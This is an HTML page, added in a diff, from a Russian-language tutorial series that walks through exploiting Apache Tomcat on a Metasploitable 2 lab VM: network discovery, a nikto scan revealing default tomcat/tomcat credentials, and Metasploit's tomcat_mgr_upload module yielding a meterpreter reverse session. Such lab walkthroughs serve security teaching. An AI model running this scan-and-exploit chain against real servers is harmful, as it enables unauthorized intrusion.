@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Эксплуатируем уязвимость Apache Tomcat на metasploitable-linux-2.0.0</title>
+
+	<meta name="DESCRIPTION" content="Эксплуатируем уязвимость Apache Tomcat на metasploitable-linux-2.0.0">
+	<meta name="KEYWORDS" content="Эксплуатируем уязвимость Apache Tomcat на metasploitable-linux-2.0.0">
+
+  <meta property="og:url"                content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2s.html" />
+  <meta property="og:type"               content="article" />
+  <meta property="og:title"              content="Ed Kurlyak - Эксплуатируем уязвимость Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:description"        content="Эксплуатируем уязвимость Apache Tomcat на metasploitable-linux-2.0.0" />
+  <meta property="og:image"              content="https://ed-kurlyak.github.io/08.004-metasp2/metasp2.png" />
+
+<style type="text/css">
+body {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #000;
+	color: #ffffff;
+}
+
+pre {
+	font-size: 24px;
+	font-family: "Consolas";
+	background-color: #ffffaa;
+	color: #000;
+	width: max-content;
+	min-width: 100%;
+
+}
+
+div.my_selected {
+	width: 100%;
+	background-color: #ffff55;
+	position: relative;
+}
+
+a:link, a:visited { color: #aaaaaa; text-decoration: none; font-weight: normal;} 
+a:active, a:hover { color: #aaaaaa; text-decoration: underline;}
+
+p {
+	text-align: justify;
+	margin-right: 20px;
+}
+
+</style>	
+</head>
+<body>
+
+<h3>
+Часть 19. Эксплуатируем уязвимость Apache Tomcat на в metasploitable-linux-2.0.0
+</h3>
+
+<p>
+Предполагается что все действия выполняются на виртуальных машинах VirtualBox.
+</p>
+
+
+<p>
+Начинаем атаку на удаленную машину Metasploitable 2.
+</p>
+
+
+<p>
+Необходимо определить IP с машиной Metasploitable 2. Для этого сначала определим наш IP и маску подсети, для этого дадим команду в терминале Kali:
+</p>
+
+<p>
+ifconfig
+</p>
+
+<p>
+В результатах вывода команды выше, можно увидеть такую строку:
+</p>
+
+<p>
+inet 10.0.2.4  netmask 255.255.255.0 
+</p>
+
+<p>
+То есть наш IP 10.0.2.4 а диапазон IP адресов нашей сети 10.0.2.0/24 (это обяснялось ранее в предыдущих статьях).
+</p>
+
+<p>
+Для обнаружения других компьютеров в сети и в том числе нашей удаленной машины Metasploitable 2, дадим команду в терминале Kali:
+</p>
+
+<p>
+sudo netdiscover -r 10.0.2.0/24
+</p>
+
+<p>
+В выводе команды:
+</p>
+
+<p>
+10.0.2.2        08:00:27:3a:17:ed      1      60  PCS Systemtechnik GmbH
+10.0.2.3        08:00:27:f1:18:5a      1      60  PCS Systemtechnik GmbH
+</p>
+
+<p>
+10.0.2.2 - это виртуальный роутер, который управляет нашей сетью.
+</p>
+
+<p>
+10.0.2.3 - это наша машина (по логике) с Metasploitable 2.
+</p>
+
+<p>
+Проверим связь между нашей Kali и удаленной ВМ Metasploitable 2, дадим команду:
+</p>
+
+<p>
+ping 10.0.2.3
+</p>
+
+<p>
+Если сеть в VirtualBox настроена правильно, видим пинг идет, связь есть.
+</p>
+
+<p>
+На Kali выполняем команду в терминале:
+</p>
+
+<p>
+nikto -h 10.0.2.3:8180
+</p>
+
+<img src="./pics/pic138.jpg" width=1400 alt="kali linux терминал команда nikto">
+
+<p>
+Мы нашли логин/пароль - tomcat/tomcat.
+</p>
+
+
+<p>
+Запускаем метсплоит консоль:
+</p>
+
+<p>
+msfconsole
+</p>
+
+<p>
+Даем команду и подставляем найденный логин/пароль:
+</p>
+
+<p>
+msf > search tomcat
+<br>
+msf > use exploit/multi/http/tomcat_mgr_upload
+<br>
+msf exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.0.2.3
+<br>
+msf exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
+<br>
+msf exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
+<br>
+msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
+<br>
+msf exploit(multi/http/tomcat_mgr_upload) > exploit
+</p>
+
+<p>
+В некоторых случаях еще дополнительно надо укзать LHOST:
+</p>
+
+<p>
+set LHOST 10.0.2.4
+</p>
+
+<p>
+И получили сессию meterpreter (скриншот ниже):
+</p>
+
+<img src="./pics/pic139.jpg" width=1400 alt="kali linux терминал команда msfconsole exploit">
+
+<p>
+Даем команду ifconfig что бы узнать точно на какой машине мы находимся (скриншот ниже):
+</p>
+
+<img src="./pics/pic140.jpg" width=1400 alt="kali linux терминал команда msfconsole ifconfig">
+
+<p>
+Вывод команды подтверждает мы на удаленной Metasploitable 2 IP 10.0.2.3.
+</p>
+
+<p>
+При помощи команды exit выходим из meterpreter и msfconsole.
+</p>
+
+</body>
+</html>
